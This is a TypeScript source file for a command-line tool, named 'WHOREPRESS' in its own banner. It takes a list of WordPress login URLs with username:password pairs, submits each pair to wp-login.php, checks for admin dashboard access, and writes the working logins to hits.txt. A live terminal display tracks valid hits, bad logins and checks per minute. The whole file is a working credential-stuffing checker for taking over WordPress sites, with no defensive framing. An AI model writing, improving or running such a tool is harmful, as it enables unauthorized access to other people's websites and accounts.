import axios from 'axios';
import { wrapper } from 'axios-cookiejar-support';
import { CookieJar } from 'tough-cookie';
import fs from 'fs';
import readline from 'readline';
import colors from 'colors';
import { banner } from './constant/banner';
import { IWordpress, LogEntry } from './interfaces/wp.interfaces';
import blessed from 'blessed';

// Get command line arguments for filename and debug mode
const filename: string = process.argv[2];
const debugMode: boolean = process.argv.includes('--debug');

if (!filename) {
    console.log('Usage: node main.js <list.txt> [--debug]');
    process.exit(1);
}

const screen = blessed.screen({
    smartCSR: true,
    title: 'WHOREPRESS'
});

screen.key(['C-c'], function (_ch: any, _key: any) {
    return process.exit(0);
});

const logBox = blessed.box({
    top: 'center',
    left: 'center',
    width: '90%',
    height: '80%',
    content: banner(),
    tags: true,
    scrollable: true,
    alwaysScroll: true,
    scrollbar: {
        ch: ' ',
        inverse: true
    },
    border: {
        type: 'line'
    },
    style: {
        fg: 'white',
        bg: 'black',
        border: {
            fg: '#f0f0f0'
        }
    }
});

screen.append(logBox);

class Wordpress implements IWordpress {
    public hits: number;
    public bad: number;
    public cpm: number;
    public result: fs.WriteStream;
    public start: number;
    public logBuffer: LogEntry[];
    private client: any;

    constructor() {
        this.hits = 0;
        this.bad = 0;
        this.cpm = 0;
        this.result = fs.createWriteStream('hits.txt', { flags: 'a+' });
        this.start = Date.now();
        this.logBuffer = [];
        this.client = wrapper(axios.create({ jar: new CookieJar() }));
        this.updateTitle();
        this.calculateCpm();
    }

    displayUI(): void {
        logBox.setContent(banner() + this.getLogContent());
        screen.render();
    }

    getLogContent(): string {
        const recentHits = this.logBuffer.filter(entry => entry.type === 'HIT').slice(-3);
        const recentBads = this.logBuffer.filter(entry => entry.type === 'BAD').slice(-3);
        let content = '\n' + colors.green('Recent Valid Hits:\n');
        recentHits.forEach(entry => {
            content += `${colors.green('[+])')} ${colors.green('HIT')} | ${entry.url} | ${entry.username} | ${entry.password}\n`;
        });
        content += colors.red('Recent Bad Logins:\n');
        recentBads.forEach(entry => {
            content += `${colors.red('[-]')} ${colors.red('BAD')} | ${entry.url} | ${entry.username} | ${entry.password}\n`;
        });
        return content;
    }

    async updateTitle(): Promise<void> {
        while (true) {
            const elapsed = new Date(Date.now() - this.start).toISOString().substr(11, 8);
            logBox.setLabel(`[WHOREPRESS] Valid Hits: ${this.hits} | Bad: ${this.bad} | CPM: ${this.cpm} | Time elapsed: ${elapsed}`);
            screen.render();
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }

    async calculateCpm(): Promise<void> {
        while (true) {
            const oldHits = this.hits;
            await new Promise(resolve => setTimeout(resolve, 4000));
            this.cpm = (this.hits - oldHits) * 15;
        }
    }

    async checkAccount(url: string, username: string, password: string): Promise<void> {
        try {
            const payload = new URLSearchParams({
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
                'testcookie': '1'
            });

            const headers = {
                'User-Agent': 'Mozilla/5.0',
                'Referer': url
            };

            if (!/^https?:\/\//i.test(url)) {
                url = 'https://' + url;
            }

            const response = await this.client.post(url, payload.toString(), {
                headers,
                maxRedirects: 0,
                validateStatus: (status) => status === 302 || status === 200,
                withCredentials: true
            });

            const cookies = response.headers['set-cookie'];
            if (debugMode) {
                console.log('Response headers:', response.headers);
            }

            if (cookies && cookies.some(cookie => cookie.startsWith('wordpress_logged_in'))) {
                const dashboardUrl = url.replace('wp-login.php', 'wp-admin/');
                const cookieHeader = cookies.join('; ');

                if (debugMode) {
                    console.log('Attempting to access dashboard URL:', dashboardUrl);
                }

                const r = await this.client.get(dashboardUrl, {
                    headers: {
                        ...headers,
                        'Cookie': cookieHeader
                    },
                    withCredentials: true
                });

                if (debugMode) {
                    console.log('Final response data:', r.data);
                }

                if (r.data.includes('dashicons-admin-plugins') || r.data.includes('wp-admin-bar')) {
                    this.hits += 1;
                    if (this.result.writable) {
                        this.result.write(`${url} - ${username}|${password}\n`);
                    }
                    this.logBuffer.push({ type: 'HIT', url, username, password });
                } else {
                    this.bad += 1;
                    this.logBuffer.push({ type: 'BAD', url, username, password });
                }
            } else {
                this.bad += 1;
                this.logBuffer.push({ type: 'BAD', url, username, password });
            }
        } catch (error) {
            if (debugMode) {
                console.error(`Error checking account ${username}@${url}:`, error);
            }
            this.bad += 1;
            this.logBuffer.push({ type: 'BAD', url, username, password });
        } finally {
            this.displayUI();
        }
    }
}

function readAccounts(filename: string): void {
    const fileStream = fs.createReadStream(filename);
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });

    rl.on('line', (line: string) => {
        const match = line.match(/(https?:\/\/[^\s\/]+\/(?:wp-login\.php|wp-admin|user-new\.php))\s*:\s*([^\s:]+)\s*:\s*([^\s:]+)/);
        if (match) {
            wp.checkAccount(match[1], match[2], match[3]);
        }
    });

    rl.on('close', () => {
        wp.result.end();
    });
}

const wp = new Wordpress();
wp.displayUI();

readAccounts(filename);

process.on('SIGINT', () => {
    wp.result.end(() => {
        console.log('Wait a few seconds for threads to exit...');
        process.exit();
    });
});
